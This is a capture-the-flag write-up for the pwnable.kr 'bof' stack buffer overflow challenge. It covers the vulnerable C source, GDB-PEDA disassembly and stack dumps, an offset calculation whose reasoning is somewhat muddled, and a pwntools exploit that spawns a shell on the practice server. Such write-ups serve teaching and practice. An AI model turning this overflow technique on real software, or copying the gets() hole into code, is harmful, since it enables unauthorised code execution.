@@ -1,0 +1,184 @@
+This challenge quite straigh forward buffer overflow. Good thing is it shipped along with source code. The code and binary can be downloaded from:
+
+	i. binary - http://pwnable.kr/bin/bof
+	ii. source code - http://pwnable.kr/bin/bof.c
+
+
+Looking at the source code shows us a lot of hints. 
+
+yuri@byakugan:~/pwnable_kr/bof$ cat bof.c 
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+void func(int key){
+	char overflowme[32];
+	printf("overflow me : ");
+	gets(overflowme);	// smash me!
+	if(key == 0xcafebabe){
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+int main(int argc, char* argv[]){
+	func(0xdeadbeef);
+	return 0;
+}
+
+
+Function func() is where the vulnerability exist. Buffer allocated only 32 bytes here. So the chances for us to overwrite something quite high. gets() is the one that allowed us to overflow the program. However, the program can be control once overflow. In order to control it, we need to send buffer along with the key "0xcafebabe". If the key match, we should be able to land to "/bin/sh". So the exploitation vector has to something like this:
+
+[buffer][key][NULL_terminator]
+
+
+We used PEDA to generate pattern to fill the buffer in the gets(). We put a breakpoint in GDB at the offset 0x4006b2.
+
+gdb-peda$ disas func
+Dump of assembler code for function func:
+   0x000000000040067d <+0>:	push   rbp
+   0x000000000040067e <+1>:	mov    rbp,rsp
+   0x0000000000400681 <+4>:	sub    rsp,0x40
+   0x0000000000400685 <+8>:	mov    DWORD PTR [rbp-0x34],edi
+   0x0000000000400688 <+11>:	mov    rax,QWORD PTR fs:0x28
+   0x0000000000400691 <+20>:	mov    QWORD PTR [rbp-0x8],rax
+   0x0000000000400695 <+24>:	xor    eax,eax
+   0x0000000000400697 <+26>:	mov    edi,0x400794
+   0x000000000040069c <+31>:	mov    eax,0x0
+   0x00000000004006a1 <+36>:	call   0x400550 <printf@plt>
+   0x00000000004006a6 <+41>:	lea    rax,[rbp-0x30]
+   0x00000000004006aa <+45>:	mov    rdi,rax
+   0x00000000004006ad <+48>:	call   0x400580 <gets@plt>
+   0x00000000004006b2 <+53>:	cmp    DWORD PTR [rbp-0x34],0xcafebabe
+   0x00000000004006b9 <+60>:	jne    0x4006c7 <func+74>
+   0x00000000004006bb <+62>:	mov    edi,0x4007a3
+   0x00000000004006c0 <+67>:	call   0x400540 <system@plt>
+   0x00000000004006c5 <+72>:	jmp    0x4006d1 <func+84>
+   0x00000000004006c7 <+74>:	mov    edi,0x4007ab
+   0x00000000004006cc <+79>:	call   0x400520 <puts@plt>
+   0x00000000004006d1 <+84>:	mov    rax,QWORD PTR [rbp-0x8]
+   0x00000000004006d5 <+88>:	xor    rax,QWORD PTR fs:0x28
+   0x00000000004006de <+97>:	je     0x4006e5 <func+104>
+   0x00000000004006e0 <+99>:	call   0x400530 <__stack_chk_fail@plt>
+   0x00000000004006e5 <+104>:	leave  
+   0x00000000004006e6 <+105>:	ret    
+End of assembler dump.
+gdb-peda$ b *0x00000000004006b2
+Breakpoint 1 at 0x4006b2
+
+
+Once we filled in the buffer, our program will stop at the offset that we set breakpoint. From here we can see the buffer that we filled in will need to check with the value 0xcafebabe before it proceeds to jump. 
+
+ [----------------------------------registers-----------------------------------]
+RAX: 0x7fffffffddc0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3")
+RBX: 0x0 
+RCX: 0xfbad2288 
+RDX: 0x2aaaab0909f0 --> 0x0 
+RSI: 0x2aaaaaad5046 --> 0xa ('\n')
+RDI: 0x7fffffffde06 --> 0x1000000000000 
+RBP: 0x7fffffffddf0 ("bAA1AAGAAcAA2AAHAAdAA3")
+RSP: 0x7fffffffddb0 --> 0x2aaaaace01f8 --> 0xc00120000283f 
+RIP: 0x4006b2 (<func+53>:	cmp    DWORD PTR [rbp-0x34],0xcafebabe)
+R8 : 0x2aaaaaad5047 --> 0x0 
+R9 : 0x413b414144414128 ('(AADAA;A')
+R10: 0x6141414541412941 ('A)AAEAAa')
+R11: 0x246 
+R12: 0x400590 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffdef0 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x4006a6 <func+41>:	lea    rax,[rbp-0x30]
+   0x4006aa <func+45>:	mov    rdi,rax
+   0x4006ad <func+48>:	call   0x400580 <gets@plt>
+=> 0x4006b2 <func+53>:	cmp    DWORD PTR [rbp-0x34],0xcafebabe
+   0x4006b9 <func+60>:	jne    0x4006c7 <func+74>
+   0x4006bb <func+62>:	mov    edi,0x4007a3
+   0x4006c0 <func+67>:	call   0x400540 <system@plt>
+   0x4006c5 <func+72>:	jmp    0x4006d1 <func+84>
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffddb0 --> 0x2aaaaace01f8 --> 0xc00120000283f 
+0008| 0x7fffffffddb8 --> 0xdeadbeefaaad34c0 
+0016| 0x7fffffffddc0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3")
+0024| 0x7fffffffddc8 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3")
+0032| 0x7fffffffddd0 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3")
+0040| 0x7fffffffddd8 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3")
+0048| 0x7fffffffdde0 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3")
+0056| 0x7fffffffdde8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x00000000004006b2 in func ()
+
+
+Peda GDB offered a function called telescope where we can inspect each of the stack execution. 
+
+gdb-peda$ telescope 30
+0000| 0x7fffffffddb0 --> 0x2aaaaace01f8 --> 0xc00120000283f 
+0008| 0x7fffffffddb8 --> 0xdeadbeefaaad34c0 
+0016| 0x7fffffffddc0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3")
+0024| 0x7fffffffddc8 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3")
+0032| 0x7fffffffddd0 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3")
+0040| 0x7fffffffddd8 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3")
+0048| 0x7fffffffdde0 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3")
+0056| 0x7fffffffdde8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3")
+0064| 0x7fffffffddf0 ("bAA1AAGAAcAA2AAHAAdAA3")
+0072| 0x7fffffffddf8 ("AcAA2AAHAAdAA3")
+0080| 0x7fffffffde00 --> 0x334141644141 ('AAdAA3')
+0088| 0x7fffffffde08 --> 0x100000000 
+0096| 0x7fffffffde10 --> 0x0 
+0104| 0x7fffffffde18 --> 0x2aaaaacf1f45 (<__libc_start_main+245>:	mov    edi,eax)
+0112| 0x7fffffffde20 --> 0x0 
+0120| 0x7fffffffde28 --> 0x7fffffffdef8 --> 0x7fffffffe294 ("/home/yuri/pwnable_kr/bof/bof")
+0128| 0x7fffffffde30 --> 0x100000000 
+0136| 0x7fffffffde38 --> 0x4006e7 (<main>:	push   rbp)
+0144| 0x7fffffffde40 --> 0x0 
+0152| 0x7fffffffde48 --> 0x908105cb52c3e6f3 
+0160| 0x7fffffffde50 --> 0x400590 (<_start>:	xor    ebp,ebp)
+0168| 0x7fffffffde58 --> 0x7fffffffdef0 --> 0x1 
+0176| 0x7fffffffde60 --> 0x0 
+0184| 0x7fffffffde68 --> 0x0 
+0192| 0x7fffffffde70 --> 0x6f7efa34ee83e6f3 
+--More--(25/30)
+0200| 0x7fffffffde78 --> 0xc5d450556f39e6f3 
+0208| 0x7fffffffde80 --> 0x0 
+0216| 0x7fffffffde88 --> 0x0 
+0224| 0x7fffffffde90 --> 0x0 
+0232| 0x7fffffffde98 --> 0x400710 (<__libc_csu_init>:	push   r15)
+
+
+From here we can took the value (below) 0x7fffffffddf8 to calculate the length of the buffer that we can used. 
+
+0072| 0x7fffffffddf8 ("AcAA2AAHAAdAA3")
+
+
+So we run the command 'pattern offset' with the offset 0x7fffffffddf8. 
+
+gdb-peda$ pattern offset AcAA2AAHAAdAA3
+AcAA2AAHAAdAA3 found at offset: 56
+
+
+We noticed that our buffer here is 56 bytes. However we haven't deduct the 4 bytes from the offset to get the actual buffer. Calculation as in:
+
+56 bytes - 4 bytes = 52 bytes
+
+
+Our final buffer are 52 bytes and this will help to controlled the execution of our exploit to avoid crashed. Since we have key value 0xcafebabe,  we can sum up as in the following:
+
+[52 bytes of buffer][0xcafebabe][NULL Terminator]
+
+
+To speed up our exploit writing, below are the reliable exploit that we made.
+
+from pwn import *
+
+target = "pwnable.kr"
+port = 9000
+magic_str = 0xcafebabe
+r = remote(target,port)
+r.send("A" * 52 + p32(magic_str)+ "\n")
+r.interactive()
+
+
+Run the exploit and pwned! Have phun \0/
